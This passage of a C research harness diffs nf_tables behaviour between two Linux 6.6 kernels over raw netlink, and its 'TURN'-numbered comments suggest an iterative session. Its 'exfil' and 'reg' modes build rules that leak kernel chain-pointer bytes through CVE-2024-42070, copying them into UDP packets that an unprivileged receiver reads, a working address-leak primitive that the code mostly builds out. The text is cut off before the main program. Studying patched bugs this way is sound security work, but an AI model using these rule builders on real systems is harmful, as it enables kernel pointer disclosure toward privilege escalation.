/*
 * differ.c - behavioural differ for nf_tables, 6.6.13 vs 6.6.162.
 *
 * One program describes a small nftables ruleset over raw netlink; every
 * attribute in that program is then mutated one at a time (5 ways) and the
 * OUTCOME of each variant is recorded:
 *
 *     setup  : did the kernel accept the batch (OK) or reject it (errno)?
 *     send   : after the batch, a UDP packet is emitted; did it leave (SENT),
 *              was it dropped (EPERM), or did the task die (SIGKILL / signal)?
 *     extack : the kernel's own explanation, slugged, when it gives one.
 *
 * Each scenario runs in its OWN network namespace, so a scenario that leaves
 * the kernel in a strange state cannot influence the next one, and no cleanup
 * is needed.  A crash in the kernel kills only that child; the parent records
 * it and continues.
 *
 * usage: differ <program>        program = lookup_plain | lookup_invert | verdicts
 *                                          | mismatch | vmap | vmapmut
 * output: one line per scenario, sorted, on stdout:
 *     S <id>|setup=..|send=..|extack=..
 *
 * TURN 531 -- differ531 adds mode "vmap": a set whose datatype is NFT_DATA_VERDICT
 * (a verdict map) whose value is loaded into a DATA register, which is exactly the
 * door 952bf8df2225 ("fully validate NFT_DATA_VALUE on store to data registers",
 * CVE-2024-42070) closes.  In 6.6.13 the type check in nft_validate_register_store()
 * is conditional on `data != NULL`, and nft_lookup_init() passes data == NULL, so a
 * verdict-typed value is accepted into a data register.  The probe does not stop at
 * accept/reject: a `cmp` on the loaded register reads back what the kernel really
 * wrote -- the verdict code at byte 0 of the register and, for a jump element, a
 * non-zero chain pointer at byte 8 -- so the content of the register is measured,
 * not assumed.  The old modes are untouched on purpose: "all" must still produce
 * exactly the F7/F6 lines on the same kernels, which is the check that this binary
 * did not change what it used to measure.
 *
 * TURN 532 -- differ532 adds mode "exfil".  Turn 531 measured the *precondition* of
 * CVE-2024-42070 (a chain pointer sits in a data register, proved by a cmp probe);
 * this mode measures the *consequence* the fix commit itself states -- "pointer to
 * chain object can be leaked through the registers".  The rule now ends with a
 * `payload set` expression that copies 4 bytes out of the data register straight
 * into the IPv4 source address of the packet, and the receiver -- a process that has
 * dropped to uid 65534 -- reads that field back with recvfrom().  So the number that
 * comes out is bytes of kernel memory that left the kernel through a socket that
 * needs no privilege at all.
 *
 *   exfil.ctl.norule        no rule: what the receiver sees when nothing runs
 *   exfil.ctl.const         constant -> data register -> header (channel works)
 *   exfil.ctl.map_verdictreg same map, same set expression, lookup into the VERDICT
 *                           register: the data register keeps the constant, so the
 *                           leak proves the map did NOT write it
 *   exfil.acc.*             element verdict accept: leak of register bytes 0..3
 *   exfil.jump.*            element verdict "jump c1": code at +0, chain pointer at
 *                           +8 (lo) and +12 (hi) -- two words of a kernel address
 * Each forbidden-door scenario has a partner that differs in exactly one thing, the
 * same discipline as the cmp grid of turn 531.
 *
 * TURN 533 -- differ533 adds mode "reg": turn 532 showed that 4 bytes of the chain
 * pointer leave the kernel in one packet; this mode asks how MUCH leaves per packet
 * and whether the bytes can be cross-checked against each other inside a single
 * datagram.  Two expressions now read the same data register:
 *
 *   payload set base=TRANSPORT off=8  len=16  <- register bytes 0..15   (UDP payload)
 *   payload set base=NETWORK   off=12 len=4   <- register bytes 8..11   (ip saddr)
 *   payload set base=NETWORK   off=1  len=1   <- register bytes 0..3    (ip tos)
 *
 * so one datagram carries the whole 16-byte register and, in the header, two of the
 * same bytes again.  The receiver (uid 65534) reads the payload with recvmsg(), the
 * source address from msg_name, and the tos byte from an IP_TOS control message.
 * The overlap is the point: saddr must equal payload bytes 8..11 and tos payload
 * byte 0, byte for byte, inside ONE packet -- a check that does not depend on my
 * knowledge of the kernel's layout.
 *
 *   reg.ctl.norule          no rule at all: what the channels carry with nothing running
 *   reg.ctl.const           16-byte constant -> data register -> both channels
 *   reg.ctl.map_verdictreg  same map, same set expression, lookup into VERDICT register
 *   reg.acc.full            element verdict accept, both channels
 *   reg.jump.full           element verdict "jump c1", both channels
 *   reg.jump2.full          the same for a second chain object c2
 *   reg.jump.hdr            partner of reg.jump.full without the 16-byte payload write
 *   reg.jump.pay            partner of reg.jump.full without the two header writes
 *
 * Register byte offsets are addressed in 32-bit words (nft_parse_register_load), so
 * a 1-byte write can only start on a word boundary: that is why the header channel
 * carries saddr (word +8) and tos (word +0) rather than one contiguous run.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef NLA_F_NESTED
#define NLA_F_NESTED (1 << 15)
#endif
#define NLA_HDRLEN 4
#define NLA_ALIGN_(len) (((len) + 3) & ~3u)

#define NFNL_SUBSYS_NFTABLES 10
#define NFNL_MSG_BATCH_BEGIN 0x10
#define NFNL_MSG_BATCH_END 0x11

#define NFT_MSG_NEWTABLE 0
#define NFT_MSG_DELTABLE 2
#define NFT_MSG_NEWCHAIN 3
#define NFT_MSG_DELCHAIN 5
#define NFT_MSG_NEWRULE 6
#define NFT_MSG_NEWSET 9
#define NFT_MSG_NEWSETELEM 12
#define NFT_MSG_NEWOBJ 18      /* enum nf_tables_msg_types: ... TRACE 17, NEWOBJ 18 */

#define NFTA_TABLE_NAME 1
#define NFTA_TABLE_FLAGS 2
#define NFTA_CHAIN_TABLE 1
#define NFTA_CHAIN_NAME 3
#define NFTA_CHAIN_HOOK 4
#define NFTA_CHAIN_POLICY 5
#define NFTA_CHAIN_TYPE 7
#define NFTA_HOOK_HOOKNUM 1
#define NFTA_HOOK_PRIORITY 2
#define NFTA_RULE_TABLE 1
#define NFTA_RULE_CHAIN 2
#define NFTA_RULE_HANDLE 3
#define NFTA_RULE_EXPRESSIONS 4
#define NFTA_EXPR_NAME 1
#define NFTA_EXPR_DATA 2
#define NFTA_IMMEDIATE_DREG 1
#define NFTA_IMMEDIATE_DATA 2
#define NFTA_DATA_VALUE 1
#define NFTA_DATA_VERDICT 2
#define NFTA_VERDICT_CODE 1
#define NFTA_LIST_ELEM 1
#define NFTA_SET_TABLE 1
#define NFTA_SET_NAME 2
#define NFTA_SET_FLAGS 3
#define NFTA_SET_KEY_TYPE 4
#define NFTA_SET_KEY_LEN 5
#define NFTA_SET_ID 10
#define NFTA_SET_DESC 9   /* turn 534: was 8 (= NFTA_SET_POLICY); uapi says 9 */
#define NFTA_SET_TIMEOUT 11
#define NFTA_SET_ELEM_LIST_TABLE 1
#define NFTA_SET_ELEM_LIST_SET 2
#define NFTA_SET_ELEM_LIST_ELEMENTS 3
#define NFTA_SET_ELEM_KEY 1
#define NFTA_SET_ELEM_FLAGS 3
#define NFTA_SET_ELEM_TIMEOUT 4
#define NFTA_LOOKUP_SET 1
#define NFTA_LOOKUP_SET_ID 4
#define NFTA_LOOKUP_SREG 2
#define NFTA_LOOKUP_DREG 3
#define NFTA_LOOKUP_FLAGS 5
#define NFTA_PAYLOAD_DREG 1
#define NFTA_PAYLOAD_BASE 2
#define NFTA_PAYLOAD_OFFSET 3
#define NFTA_PAYLOAD_LEN 4
#define NFTA_PAYLOAD_SREG 5    /* turn 532: source register of a payload SET */
#define NFTA_CMP_SREG 1
#define NFTA_CMP_OP 2
#define NFTA_CMP_DATA 3
#define NFTA_RANGE_SREG1 1
#define NFTA_RANGE_OP 2

#define NFT_REG_VERDICT 0
#define NFT_REG_1 1
#define NFT_REG32_00 8   /* first data register of the 32-bit register file */
#define NFT_REG32_08 16  /* register bytes 32..35: used as the map key by the controls */

/* Turn 530: the immediate expression normally stores its verdict into the verdict
 * register.  Point the same expression at a DATA register instead and the store
 * carries a verdict where the kernel expects NFT_DATA_VALUE -- exactly what
 * 952bf8df2225 ("fully validate NFT_DATA_VALUE on store to data registers")
 * started rejecting.  Changed only by mode "mismatch". */
static uint32_t g_imm_dreg = NFT_REG_VERDICT;
#define NFT_PAYLOAD_NETWORK_HEADER 1
#define NFT_PAYLOAD_TRANSPORT_HEADER 2
#define NFT_LOOKUP_F_INV (1 << 0)
#define NFT_SET_ELEM_CATCHALL 0x2
#define NFT_SET_CONSTANT 0x2   /* turn 534: was 0x1 (= NFT_SET_ANONYMOUS) */
#define NFT_SET_TIMEOUT_ 0x10   /* turn 534: was 1<<3 (= NFT_SET_MAP); uapi says 0x10 */
#define NFT_DATA_VALUE 0
#define NFT_DATA_VERDICT 0xffffff00u

/* turn 531: map-with-verdict attributes */
#define NFTA_SET_DATA_TYPE 6
#define NFTA_SET_DATA_LEN 7
#define NFTA_SET_ELEM_DATA 2
#define NFTA_VERDICT_CHAIN 2
#define NFT_SET_MAP 0x8
#define NFT_CMP_EQ 0
#define NFT_CMP_NEQ 1
#define NFT_JUMP 0xfffffffd          /* nftables NFT_JUMP == -3, as u32 */

#define NFPROTO_IPV4 2
#define NF_INET_LOCAL_IN 1
#define NF_INET_LOCAL_OUT 3
#define NF_ACCEPT 1
#define NF_DROP 0

struct nfgenmsg_ {
	uint8_t nfgen_family;
	uint8_t version;
	uint16_t res_id;
};

/* ---------- attribute registry ---------- */

#define MAX_OPS 24
#define MAX_RECS 256

struct attr_rec {
	int op;         /* which op (message) it lives in          */
	int off;        /* byte offset inside that op's buffer     */
	int len;        /* nla_len at build time                   */
	char label[80];
};

static struct attr_rec recs[MAX_RECS];
static int nrecs;
static int cur_op;
static char opbuf[MAX_OPS][4096];
static int nops;

static struct nlmsghdr *msg_start(char *buf, uint16_t type, uint16_t flags,
				  uint8_t family)
{
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct nfgenmsg_ *nfg;

	memset(buf, 0, 4096);
	nlh->nlmsg_len = NLMSG_HDRLEN + sizeof(*nfg);
	nlh->nlmsg_type = type;
	nlh->nlmsg_flags = flags;
	nlh->nlmsg_seq = 1;
	nfg = (struct nfgenmsg_ *)NLMSG_DATA(nlh);
	nfg->nfgen_family = family;
	nfg->version = 0;
	nfg->res_id = htons(0);
	return nlh;
}

static struct nlattr *attr_put(struct nlmsghdr *nlh, uint16_t type,
			       const void *payload, int len, const char *label)
{
	struct nlattr *a = (struct nlattr *)((char *)nlh +
					     NLMSG_ALIGN(nlh->nlmsg_len));
	a->nla_type = type;
	a->nla_len = NLA_HDRLEN + len;
	if (len && payload)
		memcpy((char *)a + NLA_HDRLEN, payload, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN_(a->nla_len);
	if (label && nrecs < MAX_RECS) {
		recs[nrecs].op = cur_op;
		recs[nrecs].off = (int)((char *)a - opbuf[cur_op]);
		recs[nrecs].len = a->nla_len;
		snprintf(recs[nrecs].label, sizeof(recs[nrecs].label), "%s", label);
		nrecs++;
	}
	return a;
}

static struct nlattr *nest_start(struct nlmsghdr *nlh, uint16_t type,
				 const char *label)
{
	return attr_put(nlh, (uint16_t)(type | NLA_F_NESTED), NULL, 0, label);
}

static void nest_end(struct nlmsghdr *nlh, struct nlattr *a)
{
	a->nla_len = (uint16_t)((char *)nlh + nlh->nlmsg_len - (char *)a);
}

static void put_str(struct nlmsghdr *nlh, uint16_t t, const char *s, const char *l)
{
	attr_put(nlh, t, s, (int)strlen(s) + 1, l);
}

static void put_be32(struct nlmsghdr *nlh, uint16_t t, uint32_t v, const char *l)
{
	uint32_t be = htonl(v);
	attr_put(nlh, t, &be, sizeof(be), l);
}

static void put_u32(struct nlmsghdr *nlh, uint16_t t, uint32_t v, const char *l)
{
	attr_put(nlh, t, &v, sizeof(v), l);
}

/* ---------- program builders ---------- */

static struct nlmsghdr *op_newtable(const char *table)
{
	struct nlmsghdr *nlh;
	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_TABLE_NAME, table, "table.name");
	nops++;
	return nlh;
}

static struct nlmsghdr *op_newset(const char *table, const char *set)
{
	struct nlmsghdr *nlh;
	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_SET_TABLE, table, "set.table");
	put_str(nlh, NFTA_SET_NAME, set, "set.name");
	put_be32(nlh, NFTA_SET_KEY_TYPE, NFT_DATA_VALUE, "set.key_type");
	put_be32(nlh, NFTA_SET_KEY_LEN, 4, "set.key_len");
	put_be32(nlh, NFTA_SET_ID, 1, "set.id");
	nops++;
	return nlh;
}

static struct nlmsghdr *op_newsetelem(const char *table, const char *set,
				      uint32_t member_be, int with_catchall)
{
	struct nlmsghdr *nlh;
	struct nlattr *elems, *elem, *key;
	uint32_t flags;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE, NFPROTO_IPV4);
	put_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table, "setelem.table");
	put_str(nlh, NFTA_SET_ELEM_LIST_SET, set, "setelem.set");
	elems = nest_start(nlh, NFTA_SET_ELEM_LIST_ELEMENTS, "setelem.elements");
	elem = nest_start(nlh, NFTA_LIST_ELEM, "setelem.elem0");
	key = nest_start(nlh, NFTA_SET_ELEM_KEY, "setelem.elem0.key");
	attr_put(nlh, NFTA_DATA_VALUE, &member_be, 4, "setelem.elem0.key.value");
	nest_end(nlh, key);
	nest_end(nlh, elem);
	if (with_catchall) {
		flags = NFT_SET_ELEM_CATCHALL;
		elem = nest_start(nlh, NFTA_LIST_ELEM, "setelem.elem1");
		put_be32(nlh, NFTA_SET_ELEM_FLAGS, flags, "setelem.elem1.flags");
		nest_end(nlh, elem);
	}
	nest_end(nlh, elems);
	nops++;
	return nlh;
}

static struct nlmsghdr *op_newchain(const char *table, const char *chain,
				    int hooknum, int priority, uint32_t policy)
{
	struct nlmsghdr *nlh;
	struct nlattr *hook;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_CHAIN_TABLE, table, "chain.table");
	put_str(nlh, NFTA_CHAIN_NAME, chain, "chain.name");
	put_str(nlh, NFTA_CHAIN_TYPE, "filter", "chain.type");
	put_be32(nlh, NFTA_CHAIN_POLICY, policy, "chain.policy");
	hook = nest_start(nlh, NFTA_CHAIN_HOOK, "chain.hook");
	put_be32(nlh, NFTA_HOOK_HOOKNUM, (uint32_t)hooknum, "chain.hook.hooknum");
	put_be32(nlh, NFTA_HOOK_PRIORITY, (uint32_t)priority, "chain.hook.priority");
	nest_end(nlh, hook);
	nops++;
	return nlh;
}

/* rule: payload(ip saddr)->reg1 ; [lookup @set (invert?)] ; immediate verdict */
static struct nlmsghdr *op_newrule_lookup(const char *table, const char *chain,
					  const char *set, int invert,
					  uint32_t verdict, int with_lookup)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs, *elem, *edata, *idata, *vdata;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "rule.exprs");

	elem = nest_start(nlh, NFTA_LIST_ELEM, "rule.exprs[0]");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "rule.exprs[0].name");
	edata = nest_start(nlh, NFTA_EXPR_DATA, "rule.exprs[0].data");
	put_be32(nlh, NFTA_PAYLOAD_DREG, NFT_REG_1, "rule.payload.dreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, NFT_PAYLOAD_NETWORK_HEADER, "rule.payload.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, 12, "rule.payload.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, 4, "rule.payload.len");
	nest_end(nlh, edata);
	nest_end(nlh, elem);

	if (with_lookup) {
		elem = nest_start(nlh, NFTA_LIST_ELEM, "rule.exprs[1]");
		put_str(nlh, NFTA_EXPR_NAME, "lookup", "rule.exprs[1].name");
		edata = nest_start(nlh, NFTA_EXPR_DATA, "rule.exprs[1].data");
		put_str(nlh, NFTA_LOOKUP_SET, set, "rule.lookup.set");
		put_be32(nlh, NFTA_LOOKUP_SREG, NFT_REG_1, "rule.lookup.sreg");
		if (invert)
			put_be32(nlh, NFTA_LOOKUP_FLAGS, NFT_LOOKUP_F_INV,
				 "rule.lookup.flags");
		nest_end(nlh, edata);
		nest_end(nlh, elem);
	}

	elem = nest_start(nlh, NFTA_LIST_ELEM, "rule.exprs[2]");
	put_str(nlh, NFTA_EXPR_NAME, "immediate", "rule.exprs[2].name");
	edata = nest_start(nlh, NFTA_EXPR_DATA, "rule.exprs[2].data");
	put_be32(nlh, NFTA_IMMEDIATE_DREG, g_imm_dreg, "rule.immediate.dreg");
	idata = nest_start(nlh, NFTA_IMMEDIATE_DATA, "rule.immediate.data");
	vdata = nest_start(nlh, NFTA_DATA_VERDICT, "rule.immediate.data.verdict");
	put_be32(nlh, NFTA_VERDICT_CODE, verdict, "rule.immediate.verdict.code");
	nest_end(nlh, vdata);
	nest_end(nlh, idata);
	nest_end(nlh, edata);
	nest_end(nlh, elem);

	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* ---------- verdict-map builders (turn 531) ---------- */

/* The element verdict and the cmp probe are globals because the child process
 * rebuilds the program after fork(); the parent sets them before the fork, so
 * parent and child describe the same program. */
static uint32_t g_vcode = NF_ACCEPT;   /* element verdict code              */
static const char *g_vchain;           /* element verdict chain, or NULL    */
static int g_cmp_on;                   /* 0 = no cmp probe                  */
static int g_cmp_len = 4;              /* bytes the cmp probe reads         */
static int g_cmp_off;                  /* 32-bit registers past NFT_REG32_00 */
static int g_cmp_op = NFT_CMP_EQ;
static unsigned char g_cmp_val[16];

/* turn 532: exfiltration probe state */
static int g_exfil_off;                 /* byte offset inside the data register */
static int g_exfil_mode;                /* 1 = probe reads the source address    */
/* turn 533: 16-byte constant whose every byte is distinct, so a control line says
 * exactly which byte of the register landed where */
static const unsigned char g_reg_const[16] = {
	0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14,
	0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c,
};
static int g_reg_mode;                  /* 1 = probe reads payload + header      */
static const unsigned char g_exfil_const[4] = { 0x0d, 0x0e, 0x0f, 0x10 };

static struct nlmsghdr *op_newchain_regular(const char *table, const char *chain)
{
	struct nlmsghdr *nlh;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_CHAIN_TABLE, table, "chain2.table");
	put_str(nlh, NFTA_CHAIN_NAME, chain, "chain2.name");
	nops++;
	return nlh;
}

/* a map: key -> verdict.  For NFT_DATA_VERDICT the kernel fixes dlen itself
 * (desc.dlen = sizeof(struct nft_verdict)), so NFTA_SET_DATA_LEN is not sent. */
static struct nlmsghdr *op_newset_map(const char *table, const char *set)
{
	struct nlmsghdr *nlh;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_SET_TABLE, table, "map.table");
	put_str(nlh, NFTA_SET_NAME, set, "map.name");
	put_be32(nlh, NFTA_SET_FLAGS, NFT_SET_MAP, "map.flags");
	put_be32(nlh, NFTA_SET_KEY_TYPE, NFT_DATA_VALUE, "map.key_type");
	put_be32(nlh, NFTA_SET_KEY_LEN, 4, "map.key_len");
	put_be32(nlh, NFTA_SET_DATA_TYPE, NFT_DATA_VERDICT, "map.data_type");
	put_be32(nlh, NFTA_SET_ID, 2, "map.id");
	nops++;
	return nlh;
}

static struct nlmsghdr *op_newsetelem_vmap(const char *table, const char *set,
					   uint32_t member_be, uint32_t code,
					   const char *chain)
{
	struct nlmsghdr *nlh;
	struct nlattr *elems, *elem, *key, *data, *vd;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE, NFPROTO_IPV4);
	put_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table, "mapelem.table");
	put_str(nlh, NFTA_SET_ELEM_LIST_SET, set, "mapelem.set");
	elems = nest_start(nlh, NFTA_SET_ELEM_LIST_ELEMENTS, "mapelem.elements");
	elem = nest_start(nlh, NFTA_LIST_ELEM, "mapelem.elem0");
	key = nest_start(nlh, NFTA_SET_ELEM_KEY, "mapelem.elem0.key");
	attr_put(nlh, NFTA_DATA_VALUE, &member_be, 4, "mapelem.elem0.key.value");
	nest_end(nlh, key);
	data = nest_start(nlh, NFTA_SET_ELEM_DATA, "mapelem.elem0.data");
	vd = nest_start(nlh, NFTA_DATA_VERDICT, "mapelem.elem0.data.verdict");
	put_be32(nlh, NFTA_VERDICT_CODE, code, "mapelem.elem0.data.verdict.code");
	if (chain)
		put_str(nlh, NFTA_VERDICT_CHAIN, chain,
			"mapelem.elem0.data.verdict.chain");
	nest_end(nlh, vd);
	nest_end(nlh, data);
	nest_end(nlh, elem);
	nest_end(nlh, elems);
	nops++;
	return nlh;
}

/* rule: payload(saddr)->reg1 ; lookup @map into <dreg> ; [cmp probe] ; [immediate accept]
 * dreg == 0xffffffff means "no dreg": the map lookup itself decides the verdict. */
static struct nlmsghdr *op_newrule_vmap(const char *table, const char *chain,
					const char *set, uint32_t dreg)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs, *elem, *edata, *idata, *vdata, *cdata;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "vrule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "vrule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "vrule.exprs");

	elem = nest_start(nlh, NFTA_LIST_ELEM, "vrule.exprs[0]");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "vrule.exprs[0].name");
	edata = nest_start(nlh, NFTA_EXPR_DATA, "vrule.exprs[0].data");
	put_be32(nlh, NFTA_PAYLOAD_DREG, NFT_REG_1, "vrule.payload.dreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, NFT_PAYLOAD_NETWORK_HEADER,
		 "vrule.payload.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, 12, "vrule.payload.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, 4, "vrule.payload.len");
	nest_end(nlh, edata);
	nest_end(nlh, elem);

	elem = nest_start(nlh, NFTA_LIST_ELEM, "vrule.exprs[1]");
	put_str(nlh, NFTA_EXPR_NAME, "lookup", "vrule.exprs[1].name");
	edata = nest_start(nlh, NFTA_EXPR_DATA, "vrule.exprs[1].data");
	put_str(nlh, NFTA_LOOKUP_SET, set, "vrule.lookup.set");
	put_be32(nlh, NFTA_LOOKUP_SREG, NFT_REG_1, "vrule.lookup.sreg");
	if (dreg != 0xffffffffu)
		put_be32(nlh, NFTA_LOOKUP_DREG, dreg, "vrule.lookup.dreg");
	nest_end(nlh, edata);
	nest_end(nlh, elem);

	if (g_cmp_on) {
		elem = nest_start(nlh, NFTA_LIST_ELEM, "vrule.exprs[2]");
		put_str(nlh, NFTA_EXPR_NAME, "cmp", "vrule.exprs[2].name");
		edata = nest_start(nlh, NFTA_EXPR_DATA, "vrule.exprs[2].data");
		put_be32(nlh, NFTA_CMP_SREG, (uint32_t)(NFT_REG32_00 + g_cmp_off),
			 "vrule.cmp.sreg");
		put_be32(nlh, NFTA_CMP_OP, (uint32_t)g_cmp_op, "vrule.cmp.op");
		cdata = nest_start(nlh, NFTA_CMP_DATA, "vrule.cmp.data");
		attr_put(nlh, NFTA_DATA_VALUE, g_cmp_val, g_cmp_len, "vrule.cmp.value");
		nest_end(nlh, cdata);
		nest_end(nlh, edata);
		nest_end(nlh, elem);
	}

	if (dreg != 0xffffffffu) {
		elem = nest_start(nlh, NFTA_LIST_ELEM, "vrule.exprs[3]");
		put_str(nlh, NFTA_EXPR_NAME, "immediate", "vrule.exprs[3].name");
		edata = nest_start(nlh, NFTA_EXPR_DATA, "vrule.exprs[3].data");
		put_be32(nlh, NFTA_IMMEDIATE_DREG, NFT_REG_VERDICT,
			 "vrule.immediate.dreg");
		idata = nest_start(nlh, NFTA_IMMEDIATE_DATA, "vrule.immediate.data");
		vdata = nest_start(nlh, NFTA_DATA_VERDICT,
				   "vrule.immediate.data.verdict");
		put_be32(nlh, NFTA_VERDICT_CODE, NF_ACCEPT,
			 "vrule.immediate.verdict.code");
		nest_end(nlh, vdata);
		nest_end(nlh, idata);
		nest_end(nlh, edata);
		nest_end(nlh, elem);
	}

	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* ---------- turn 532: the exfiltration rule ---------- */

/* Four emitters, one per expression the exfiltration program uses.  Each records
 * its attributes under a distinct label so the mutation machinery (unused here)
 * could still address them. */

static void exfil_payload_load(struct nlmsghdr *nlh, uint32_t dreg)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "x.ld.elem");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "x.ld.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "x.ld.data");
	put_be32(nlh, NFTA_PAYLOAD_DREG, dreg, "x.ld.dreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, NFT_PAYLOAD_NETWORK_HEADER, "x.ld.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, 12, "x.ld.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, 4, "x.ld.len");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

/* payload set: priv->len bytes from register `sreg` into the IP header at `off` */
static void exfil_payload_set(struct nlmsghdr *nlh, uint32_t sreg, uint32_t off)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "x.st.elem");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "x.st.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "x.st.data");
	put_be32(nlh, NFTA_PAYLOAD_SREG, sreg, "x.st.sreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, NFT_PAYLOAD_NETWORK_HEADER, "x.st.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, off, "x.st.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, 4, "x.st.len");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

static void exfil_imm_value(struct nlmsghdr *nlh, uint32_t dreg, const void *val,
			    int len)
{
	struct nlattr *e, *d, *v;

	e = nest_start(nlh, NFTA_LIST_ELEM, "x.iv.elem");
	put_str(nlh, NFTA_EXPR_NAME, "immediate", "x.iv.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "x.iv.data");
	put_be32(nlh, NFTA_IMMEDIATE_DREG, dreg, "x.iv.dreg");
	v = nest_start(nlh, NFTA_IMMEDIATE_DATA, "x.iv.value");
	attr_put(nlh, NFTA_DATA_VALUE, val, len, "x.iv.value.bytes");
	nest_end(nlh, v);
	nest_end(nlh, d);
	nest_end(nlh, e);
}

static void exfil_imm_verdict(struct nlmsghdr *nlh, uint32_t code)
{
	struct nlattr *e, *d, *v, *vd;

	e = nest_start(nlh, NFTA_LIST_ELEM, "x.ia.elem");
	put_str(nlh, NFTA_EXPR_NAME, "immediate", "x.ia.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "x.ia.data");
	put_be32(nlh, NFTA_IMMEDIATE_DREG, NFT_REG_VERDICT, "x.ia.dreg");
	v = nest_start(nlh, NFTA_IMMEDIATE_DATA, "x.ia.value");
	vd = nest_start(nlh, NFTA_DATA_VERDICT, "x.ia.verdict");
	put_be32(nlh, NFTA_VERDICT_CODE, code, "x.ia.verdict.code");
	nest_end(nlh, vd);
	nest_end(nlh, v);
	nest_end(nlh, d);
	nest_end(nlh, e);
}

static void exfil_lookup(struct nlmsghdr *nlh, const char *set, uint32_t sreg,
			 uint32_t dreg)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "x.lu.elem");
	put_str(nlh, NFTA_EXPR_NAME, "lookup", "x.lu.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "x.lu.data");
	put_str(nlh, NFTA_LOOKUP_SET, set, "x.lu.set");
	put_be32(nlh, NFTA_LOOKUP_SREG, sreg, "x.lu.sreg");
	put_be32(nlh, NFTA_LOOKUP_DREG, dreg, "x.lu.dreg");
	nest_end(nlh, d);
	nest_end(nlh, e);
}

/* prog 6 (the door)     : load ; lookup -> DATA reg ; payload set <- DATA reg ; accept
